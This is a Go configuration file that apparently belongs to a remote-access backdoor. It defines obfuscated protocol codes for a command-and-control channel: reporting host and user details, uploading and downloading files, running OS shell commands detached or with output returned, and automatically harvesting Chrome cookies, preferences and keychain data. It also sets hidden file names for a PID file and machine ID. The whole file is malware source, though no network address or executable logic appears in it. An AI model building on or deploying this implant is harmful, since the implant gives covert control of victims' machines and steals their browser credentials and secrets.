package config

import "time"

const (
	MSG_INFO    = "fwe9" // user,host,os,arch
	MSG_LOG     = "1q2w" // status,logmsg
	LOG_SUCCESS = "true"
	LOG_FAIL    = "false"
	MSG_PING    = "poiu"  // random128byte
	MSG_FILE    = "qpwoe" // name, filedata

	COMMAND_INFO          = "qwer" // REQ: type | RES: info
	COMMAND_UPLOAD        = "asdf" // REQ: type, path, filedata | RES: log
	COMMAND_DOWNLOAD      = "zxcv" // REQ: type, path | RES: file
	COMMAND_OSSHELL       = "vbcx" // REQ: type, shell, timeout | RES: log
	SHELL_MODE_WAITGETOUT = "qmwn"
	SHELL_MODE_DETACH     = "qalp"
	COMMAND_WAIT          = "ghdj" // REQ: type, interval | RES: ping
	COMMAND_AUTO          = "r4ys" // REQ: type, mode | RES: log
	AUTO_CHROME_GATHER    = "89io"
	AUTO_CHROME_PREFRST   = "7ujm"
	AUTO_CHROME_COOKIE    = "gi%#"
	AUTO_CHROME_KEYCHAIN  = "kyci"
	COMMAND_EXIT          = "dghh" // REQ: type | RES: x

	DURATION_ERROR_WAIT = time.Minute * 5

	PID_FILE_NAME       = ".store"
	MACHINEID_FILE_NAME = ".host"

	DAEMON_VERSION = "2.0"
)
